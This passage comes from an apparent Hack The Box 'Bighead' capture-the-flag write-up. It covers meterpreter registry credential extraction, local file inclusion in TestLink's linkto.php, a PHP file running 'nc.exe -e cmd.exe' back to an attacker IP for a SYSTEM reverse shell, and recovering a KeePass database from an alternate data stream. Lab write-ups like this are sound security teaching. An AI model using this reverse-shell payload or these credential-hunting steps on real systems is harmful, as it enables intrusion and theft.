<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
</code></pre></div></div>
<h4 id="passwordhash-"><code class="highlighter-rouge">PasswordHash</code> :</h4>
<p><code class="highlighter-rouge">reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash</code>
<img src="/images/hackthebox/bighead/106.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
</code></pre></div></div>
<h4 id="authenticate--4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000"><code class="highlighter-rouge">Authenticate</code> : <code class="highlighter-rouge">4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000</code></h4>
<h4 id="passwordhash--336d72676e6333205361797a205472794861726465722e2e2e203b440a"><code class="highlighter-rouge">PasswordHash</code> : <code class="highlighter-rouge">336d72676e6333205361797a205472794861726465722e2e2e203b440a</code></h4>
<h4 id="looks-like-hex-lets-see-authenticate-">Looks like <code class="highlighter-rouge">hex</code>, Let’s see <code class="highlighter-rouge">Authenticate</code> :</h4>
<p><img src="/images/hackthebox/bighead/107.png" alt="" /></p>
<h4 id="the-output-was-kinda-weird-thats-because-of-the-null-bytes-i-removed-them-then-i-got-the-right-output-">The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :</h4>
<p><code class="highlighter-rouge">4837334270555932557139552d5975677974354659556259302d553837743837</code>
<img src="/images/hackthebox/bighead/108.png" alt="" /></p>
<h4 id="so-this-might-be-a-password--h73bpuy2uq9u-yugyt5fyuby0-u87t87-lets-check-passwordhash-">So this might be a password : <code class="highlighter-rouge">H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code>, Let’s check <code class="highlighter-rouge">PasswordHash</code> :</h4>
<p><img src="/images/hackthebox/bighead/109.png" alt="" /></p>
<h4 id="3mrgnc3-sayz-tryharder-d-it-was-just-a-troll-anyway-we-have-a-password-lets-try-to-login-to-ssh-as-nignx-"><code class="highlighter-rouge">3mrgnc3 sayz TryHarder... ;D</code>, It was just a troll. Anyway we have a password let’s try to login to ssh as <code class="highlighter-rouge">nignx</code> :</h4>
<p><img src="/images/hackthebox/bighead/110.png" alt="" /></p>
<h4 id="it-worked-and-by-looking-at-the-files-i-figured-out-that-we-are-in-cxampp-">It worked, and by looking at the files I figured out that we are in <code class="highlighter-rouge">C:\xampp</code> :</h4>
<p><img src="/images/hackthebox/bighead/111.png" alt="" /></p>
<h4 id="there-was-also-a-usertxt-i-tried-to-read-it-but-it-said-that-it-was-a-binary-file-">There was also a <code class="highlighter-rouge">user.txt</code>, I tried to read it but it said that it was a binary file :</h4>
<p><img src="/images/hackthebox/bighead/112.png" alt="" /></p>
<h4 id="i-wanted-to-check-the-user-but-whoami-wasnt-there-">I wanted to check the user but <code class="highlighter-rouge">whoami</code> wasn’t there :</h4>
<p><img src="/images/hackthebox/bighead/113.png" alt="" /></p>
<h4 id="so-i-checked-help-and-this-shell-has-only-some-basic-commands-">So I checked <code class="highlighter-rouge">help</code> and this shell has only some basic commands :</h4>
<p><img src="/images/hackthebox/bighead/114.png" alt="" /></p>
<h4 id="i-know-that-im-inside-cxampp-now-but-what-am-i-searching-for-anyway--i-went-back-to-the-meterpreter-shell-and-checked-the-access-log-of-nginx-in-cnginxlogs-">I know that I’m inside <code class="highlighter-rouge">C:\xampp</code> now. But what am I searching for anyway ? I went back to the <code class="highlighter-rouge">meterpreter</code> shell and checked the access log of <code class="highlighter-rouge">nginx</code> in <code class="highlighter-rouge">C:\nginx\logs</code> :</h4>
<p><img src="/images/hackthebox/bighead/115.png" alt="" /></p>
<h4 id="at-the-beginning-of-the-log-i-found-some-requests-with-the-user-agent-3mrgnc3-">At the beginning of the log I found some requests with the <code class="highlighter-rouge">user-agent</code> <code class="highlighter-rouge">3mrgnc3</code> :</h4>
<p><img src="/images/hackthebox/bighead/116.png" alt="" /></p>
<h4 id="most-of-them-are-head-requests-maybe-he-was-testing-the-buffer-overflow-i-dont-really-know-but-anyway-we-are-not-looking-for-that-we-are-looking-for-requests-to-testlink-because-everything-we-have-access-to-on-port-5080-is-under-testlink">Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to <code class="highlighter-rouge">/testlink</code>. Because everything we have access to on port 5080 is under <code class="highlighter-rouge">/testlink</code>.</h4>
<h4 id="on-the-7th-of-october-2018-at-021716-and-021806-i-found-two-post-requests-to-testlinklinktophp-">On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to <code class="highlighter-rouge">/testlink/linkto.php</code> :</h4>
<p><img src="/images/hackthebox/bighead/117.png" alt="" /></p>
<h4 id="i-went-to-that-path-and-got-an-error-which-disclosed-the-path-of-the-php-file-">I went to that path and got an error which disclosed the path of the <code class="highlighter-rouge">php</code> file :</h4>
<p><img src="/images/hackthebox/bighead/118.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
</code></pre></div></div>
<h4 id="the-path-was-cxamppappstestlinkhtdocslinktophp-so-i-went-there-and-got-the-php-file-">The path was <code class="highlighter-rouge">C:\xampp\apps\testlink\htdocs\linkto.php</code> So I went there and got the <code class="highlighter-rouge">php</code> file :</h4>
<p><img src="/images/hackthebox/bighead/119.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/120.png" alt="" /></p>
<hr />

<h3 id="lfi-in-linktophp-user-flag">LFI in <code class="highlighter-rouge">linkto.php</code>, User Flag</h3>
<h4 id="its-a-long-script-so-i-will-just-focus-on-the-vulnerable-part-first-thing-i-noticed-was-this-comment-">It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :</h4>
<p><img src="/images/hackthebox/bighead/121.png" alt="" /></p>
<h4 id="so-i-checked-pipercoinphp-">So I checked <code class="highlighter-rouge">pipercoin.php</code> :</h4>
<p><img src="/images/hackthebox/bighead/122.png" alt="" /></p>
<h4 id="pipercoinphp-"><code class="highlighter-rouge">pipercoin.php</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
--&gt;                                                                                                                                         
&lt;?php                                                                                                                                       
echo('PiperCoinAuth');                                                                                                                      
?&gt;
</code></pre></div></div>
<h4 id="nothing-interesting-lets-go-back-to-linktophp">Nothing interesting, Let’s go back to <code class="highlighter-rouge">linkto.php</code></h4>
<h4 id="i-noticed-here-that-we-can-send-a-post-request-with-the-parameters-piperid-and-pipercoinid-">I noticed here that we can send a POST request with the parameters <code class="highlighter-rouge">PiperID</code> and <code class="highlighter-rouge">PiperCoinID</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php                                         
        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                     
        $PiperCoinAvitar = (string)$PiperCoinSess;}
</code></pre></div></div>
<h4 id="piperid-is-not-important-but-pipercoinid-is-its-taking-the-value-of-pipercoinid-and-assigning-it-to-another-variable-called-pipercoinauth-after-that-its-calling-require_once-with-pipercoinauth"><code class="highlighter-rouge">PiperID</code> is not important but <code class="highlighter-rouge">PiperCoinID</code> is. It’s taking the value of <code class="highlighter-rouge">PiperCoinID</code> and assigning it to another variable called <code class="highlighter-rouge">$PiperCoinAuth</code>. After that it’s calling <a href="https://www.php.net/manual/en/function.require-once.php"><code class="highlighter-rouge">require_once()</code></a> with <code class="highlighter-rouge">$PiperCoinAuth</code>.</h4>
<p><img src="/images/hackthebox/bighead/123.png" alt="" /></p>
<h4 id="the-vulnerability-here-is-obvious-if-we-can-control-whats-in-require_once-then-we-can-make-it-include-any-php-file-of-our-choice-local-file-inclusion">The vulnerability here is obvious. If we can control what’s in <code class="highlighter-rouge">require_once()</code> Then we can make it include any <code class="highlighter-rouge">php</code> file of our choice (Local File Inclusion).</h4>
<h4 id="i-created-a-simple-php-script-to-execute-ncexe-and-give-me-a-reverse-shell-">I created a simple <code class="highlighter-rouge">php</code> script to execute <code class="highlighter-rouge">nc.exe</code> and give me a reverse shell :</h4>
<p><img src="/images/hackthebox/bighead/124.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
?&gt;
</code></pre></div></div>
<h4 id="i-uploaded-it-and-uploaded-ncexe-to-cusersnelsonappdatalocaltemp-">I uploaded it and uploaded <code class="highlighter-rouge">nc.exe</code> to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\</code> :</h4>
<p><img src="/images/hackthebox/bighead/125.png" alt="" /></p>
<h4 id="last-step-is-to-exploit-the-vulnerability-we-will-send-a-post-request-to-httpcodebigheadhtbtestlinklinktophp-with-the-parameters-piperid-we-can-leave-it-empty-and-pipercoinid-which-will-be-the-path-of-the-php-script-cusersnelsonappdatalocaltemprevphp-">Last step is to exploit the vulnerability. We will send a POST request to <code class="highlighter-rouge">http://code.bighead.htb/testlink/linkto.php</code> With the parameters <code class="highlighter-rouge">PiperID</code> (we can leave it empty) and <code class="highlighter-rouge">PiperCoinID</code> which will be the path of the <code class="highlighter-rouge">php</code> script (<code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\rev.php</code>) :</h4>
<p><code class="highlighter-rouge">curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"</code>
<img src="/images/hackthebox/bighead/126.png" alt="" /></p>
<h4 id="we-get-a-reverse-shell-immediately-as-nt-authoritysystem-">We get a reverse shell immediately. As <code class="highlighter-rouge">nt authority\system</code> :</h4>
<p><img src="/images/hackthebox/bighead/127.png" alt="" /></p>
<h4 id="awesome-now-we-can-get-root-and-user-flags-right--well--no-lets-get-the-user-flag-first-">Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :</h4>
<p><img src="/images/hackthebox/bighead/128.png" alt="" /></p>
<h4 id="we-owned-user-">We owned user !</h4>
<p><br /></p>
<hr />

<h3 id="alternate-data-stream-in-roottxt">Alternate Data Stream in <code class="highlighter-rouge">root.txt</code></h3>
<h4 id="technically-we-own-root-now-but-we-still-need-to-do-some-more-stuff-to-get-the-root-flag">Technically we own root now. But we still need to do some more stuff to get the root flag.</h4>
<h4 id="i-looked-in-cusersadministratordesktop-and-the-root-flag-wasnt-there">I looked in <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code> and the root flag wasn’t there.</h4>
<p><img src="/images/hackthebox/bighead/129.png" alt="" /></p>
<h4 id="i-thought-it-might-be-hidden-so-i-tried-to-read-it-anyway-and-yes-it-was-hidden-but-">I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …</h4>
<p><img src="/images/hackthebox/bighead/130.png" alt="" /></p>
<h4 id="gilfoyles-prayer-another-silicon-valley-reference-i-terminated-the-meterpreter-session-i-had-as-nelson-then-i-went-to-cusersnelsonappdatalocaltemp-and-executed-mexe-to-get-another-meterpreter-session-as-nt-authoritysystem-after-that-i-uploaded-streamsexe-to-check-for-alternate-data-streams-on-roottxt-">Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the <code class="highlighter-rouge">meterpreter</code> session I had as <code class="highlighter-rouge">Nelson</code> then I went to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and executed <code class="highlighter-rouge">m.exe</code> to get another <code class="highlighter-rouge">meterpreter</code> session as <code class="highlighter-rouge">nt authority\system</code>. After that I uploaded <code class="highlighter-rouge">streams.exe</code> to check for alternate data streams on root.txt :</h4>
<p><img src="/images/hackthebox/bighead/131.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/132.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/133.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">streams C:\Users\Administrator\Desktop\root.txt</code>
<img src="/images/hackthebox/bighead/134.png" alt="" /></p>
<h4 id="there-is-an-alternate-stream-called-zoneidentifier-i-tried-to-read-it-but-type-and-more-didnt-work-for-some-reason">There is an alternate stream called <code class="highlighter-rouge">Zone.Identifier</code>, I tried to read it but <code class="highlighter-rouge">type</code> and <code class="highlighter-rouge">more</code> didn’t work for some reason.</h4>
<p><img src="/images/hackthebox/bighead/135.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/136.png" alt="" /></p>
<h4 id="after-reading-this-article-i-did-it-like-this--more--cusersadministratordesktoproottxtzoneidentifier-and-saved-the-output-to-a-file-and-named-it-test">After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/">this article</a> I did it like this : <code class="highlighter-rouge">more &lt; "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"</code> and saved the output to a file and named it <code class="highlighter-rouge">test</code></h4>
<p><img src="/images/hackthebox/bighead/137.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/138.png" alt="" /></p>
<h4 id="when-i-looked-at-test-i-found-that-it-was-a-binary-file-">When I looked at <code class="highlighter-rouge">test</code> I found that it was a binary file :</h4>
<p><img src="/images/hackthebox/bighead/139.png" alt="" /></p>
<h4 id="so-i-downloaded-it-to-use-file-against-it-">So I downloaded it to use <code class="highlighter-rouge">file</code> against it :</h4>
<p><img src="/images/hackthebox/bighead/140.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/141.png" alt="" /></p>
<h4 id="keepass-password-database">Keepass password database</h4>
<p><br /></p>
<hr />

<h3 id="cracking-the-database-root-flag">Cracking the Database, Root Flag</h3>
<blockquote>
  <p>KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -<a href="https://en.wikipedia.org/wiki/KeePass">Wikipedia</a></p>
</blockquote>

<h4 id="i-renamed-the-file-to-testkdbx-">I renamed the file to <code class="highlighter-rouge">test.kdbx</code> :</h4>
<p><img src="/images/hackthebox/bighead/142.png" alt="" /></p>
<h4 id="then-i-used-keepass2-to-open-it-">Then I used <code class="highlighter-rouge">keepass2</code> to open it :</h4>
<p><img src="/images/hackthebox/bighead/143.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/144.png" alt="" /></p>
<h4 id="and-of-course-we-need-a-password-and-a-key-i-went-back-to-the-shell-and-checked-the-configuration-file-for-keepass-in-cusersadministratorappdataroamingkeepass">And of course we need a password and a key. I went back to the shell and checked the configuration file for <code class="highlighter-rouge">keepass</code> in <code class="highlighter-rouge">C:\Users\Administrator\AppData\Roaming\KeePass</code></h4>
<p><img src="/images/hackthebox/bighead/145.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/146.png" alt="" /></p>
<h4 id="keepassconfigxml-">KeePass.config.xml :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Configuration</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;Meta&gt;</span>
		<span class="nt">&lt;PreferUserConfiguration&gt;</span>false<span class="nt">&lt;/PreferUserConfiguration&gt;</span>
		<span class="nt">&lt;OmitItemsWithDefaultValues&gt;</span>true<span class="nt">&lt;/OmitItemsWithDefaultValues&gt;</span>
		<span class="nt">&lt;DpiFactorX&gt;</span>1<span class="nt">&lt;/DpiFactorX&gt;</span>
		<span class="nt">&lt;DpiFactorY&gt;</span>1<span class="nt">&lt;/DpiFactorY&gt;</span>
	<span class="nt">&lt;/Meta&gt;</span>
	<span class="nt">&lt;Application&gt;</span>
		<span class="nt">&lt;LastUsedFile&gt;</span>
			<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/Path&gt;</span>
			<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
			<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
		<span class="nt">&lt;/LastUsedFile&gt;</span>
		<span class="nt">&lt;MostRecentlyUsed&gt;</span>
			<span class="nt">&lt;MaxItemCount&gt;</span>12<span class="nt">&lt;/MaxItemCount&gt;</span>
			<span class="nt">&lt;Items&gt;</span>
				<span class="nt">&lt;ConnectionInfo&gt;</span>
					<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\chest.kdbx<span class="nt">&lt;/Path&gt;</span>
					<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
					<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
				<span class="nt">&lt;/ConnectionInfo&gt;</span>
			<span class="nt">&lt;/Items&gt;</span>
		<span class="nt">&lt;/MostRecentlyUsed&gt;</span>
		<span class="nt">&lt;WorkingDirectories&gt;</span>
			<span class="nt">&lt;Item&gt;</span>Database@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
			<span class="nt">&lt;Item&gt;</span>KeyFile@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
		<span class="nt">&lt;/WorkingDirectories&gt;</span>
		<span class="nt">&lt;Start&gt;</span>
			<span class="nt">&lt;CheckForUpdate&gt;</span>false<span class="nt">&lt;/CheckForUpdate&gt;</span>
			<span class="nt">&lt;CheckForUpdateConfigured&gt;</span>true<span class="nt">&lt;/CheckForUpdateConfigured&gt;</span>
		<span class="nt">&lt;/Start&gt;</span>
		<span class="nt">&lt;FileOpening</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;FileClosing</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TriggerSystem&gt;</span>
			<span class="nt">&lt;Triggers</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/TriggerSystem&gt;</span>
		<span class="nt">&lt;PluginCompatibility</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/Application&gt;</span>
	<span class="nt">&lt;Logging</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;MainWindow&gt;</span>
		<span class="nt">&lt;X&gt;</span>2<span class="nt">&lt;/X&gt;</span>
		<span class="nt">&lt;Y&gt;</span>2<span class="nt">&lt;/Y&gt;</span>
		<span class="nt">&lt;Width&gt;</span>638<span class="nt">&lt;/Width&gt;</span>
		<span class="nt">&lt;Height&gt;</span>450<span class="nt">&lt;/Height&gt;</span>
		<span class="nt">&lt;SplitterHorizontalFrac&gt;</span>0.8333<span class="nt">&lt;/SplitterHorizontalFrac&gt;</span>
		<span class="nt">&lt;SplitterVerticalFrac&gt;</span>0.25<span class="nt">&lt;/SplitterVerticalFrac&gt;</span>
		<span class="nt">&lt;Layout&gt;</span>Default<span class="nt">&lt;/Layout&gt;</span>
		<span class="nt">&lt;ToolBar</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TanView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryListColumnCollection&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Title<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>UserName<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Password<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
				<span class="nt">&lt;HideWithAsterisks&gt;</span>true<span class="nt">&lt;/HideWithAsterisks&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Url<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Notes<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
		<span class="nt">&lt;/EntryListColumnCollection&gt;</span>
		<span class="nt">&lt;EntryListColumnDisplayOrder&gt;</span>0 1 2 3 4<span class="nt">&lt;/EntryListColumnDisplayOrder&gt;</span>
		<span class="nt">&lt;ListSorting&gt;</span>
			<span class="nt">&lt;Order&gt;</span>Ascending<span class="nt">&lt;/Order&gt;</span>
		<span class="nt">&lt;/ListSorting&gt;</span>
	<span class="nt">&lt;/MainWindow&gt;</span>
	<span class="nt">&lt;UI&gt;</span>
		<span class="nt">&lt;TrayIcon</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;Hiding</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;StandardFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/StandardFont&gt;</span>
		<span class="nt">&lt;PasswordFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Courier New<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/PasswordFont&gt;</span>
		<span class="nt">&lt;BannerStyle&gt;</span>WinVistaBlack<span class="nt">&lt;/BannerStyle&gt;</span>
		<span class="nt">&lt;DataEditorFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/DataEditorFont&gt;</span>
		<span class="nt">&lt;UIFlags&gt;</span>0<span class="nt">&lt;/UIFlags&gt;</span>
		<span class="nt">&lt;KeyCreationFlags&gt;</span>0<span class="nt">&lt;/KeyCreationFlags&gt;</span>
		<span class="nt">&lt;KeyPromptFlags&gt;</span>0<span class="nt">&lt;/KeyPromptFlags&gt;</span>
	<span class="nt">&lt;/UI&gt;</span>
	<span class="nt">&lt;Security&gt;</span>
		<span class="nt">&lt;WorkspaceLocking&gt;</span>
			<span class="nt">&lt;LockAfterTime&gt;</span>0<span class="nt">&lt;/LockAfterTime&gt;</span>
			<span class="nt">&lt;LockAfterGlobalTime&gt;</span>0<span class="nt">&lt;/LockAfterGlobalTime&gt;</span>
		<span class="nt">&lt;/WorkspaceLocking&gt;</span>
		<span class="nt">&lt;Policy</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;MasterPassword&gt;</span>
			<span class="nt">&lt;MinimumLength&gt;</span>0<span class="nt">&lt;/MinimumLength&gt;</span>
			<span class="nt">&lt;MinimumQuality&gt;</span>0<span class="nt">&lt;/MinimumQuality&gt;</span>
		<span class="nt">&lt;/MasterPassword&gt;</span>
	<span class="nt">&lt;/Security&gt;</span>
	<span class="nt">&lt;Native</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;PasswordGenerator&gt;</span>
		<span class="nt">&lt;AutoGeneratedPasswordsProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/AutoGeneratedPasswordsProfile&gt;</span>
		<span class="nt">&lt;LastUsedProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/LastUsedProfile&gt;</span>
		<span class="nt">&lt;UserProfiles</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/PasswordGenerator&gt;</span>
	<span class="nt">&lt;Defaults&gt;</span>
		<span class="nt">&lt;OptionsTabIndex&gt;</span>0<span class="nt">&lt;/OptionsTabIndex&gt;</span>
		<span class="nt">&lt;SearchParameters&gt;</span>
			<span class="nt">&lt;ComparisonMode&gt;</span>InvariantCultureIgnoreCase<span class="nt">&lt;/ComparisonMode&gt;</span>
		<span class="nt">&lt;/SearchParameters&gt;</span>
		<span class="nt">&lt;KeySources&gt;</span>
			<span class="nt">&lt;Association&gt;</span>
				<span class="nt">&lt;DatabasePath&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/DatabasePath&gt;</span>
				<span class="nt">&lt;Password&gt;</span>true<span class="nt">&lt;/Password&gt;</span>
				<span class="nt">&lt;KeyFilePath&gt;</span>..\..\Users\Administrator\Pictures\admin.png<span class="nt">&lt;/KeyFilePath&gt;</span>
			<span class="nt">&lt;/Association&gt;</span>
		<span class="nt">&lt;/KeySources&gt;</span>
	<span class="nt">&lt;/Defaults&gt;</span>
	<span class="nt">&lt;Integration&gt;</span>
		<span class="nt">&lt;HotKeyGlobalAutoType&gt;</span>393281<span class="nt">&lt;/HotKeyGlobalAutoType:&gt;</span>
		<span class="nt">&lt;HotKeySelectedAutoType&gt;</span>0<span class="nt">&lt;/HotKeySelectedAutoType&gt;</span>
		<span class="nt">&lt;HotKeyShowWindow&gt;</span>393291<span class="nt">&lt;/HotKeyShowWindow&gt;</span>
		<span class="nt">&lt;HotKeyEntryMenu&gt;</span>0<span class="nt">&lt;/HotKeyEntryMenu&gt;</span>
		<span class="nt">&lt;UrlSchemeOverrides&gt;</span>
			<span class="nt">&lt;BuiltInOverridesEnabled&gt;</span>1<span class="nt">&lt;/BuiltInOverridesEnabled&gt;</span>
			<span class="nt">&lt;CustomOverrides</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/UrlSchemeOverrides&gt;</span>
		<span class="nt">&lt;AutoTypeAbortOnWindows</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;ProxyType&gt;</span>System<span class="nt">&lt;/ProxyType&gt;</span>
		<span class="nt">&lt;ProxyAuthType&gt;</span>Auto<span class="nt">&lt;/ProxyAuthType&gt;</span>
	<span class="nt">&lt;/Integration&gt;</span>
	<span class="nt">&lt;Custom</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/Configuration&gt;</span>
</code></pre></div></div>
<h4 id="exactly-here-">Exactly here :</h4>
<p><img src="/images/hackthebox/bighead/147.png" alt="" /></p>
<h4 id="the-key-is-adminpng-in-cusersadministratorpictures-lets-download-it-">The key is <code class="highlighter-rouge">admin.png</code> in <code class="highlighter-rouge">C:\Users\Administrator\Pictures\</code>. Let’s download it :</h4>
<p><img src="/images/hackthebox/bighead/148.png" alt="" /></p>
<h4 id="adminpng-">admin.png :</h4>
<p><img src="/images/hackthebox/bighead/admin.png" alt="" /></p>
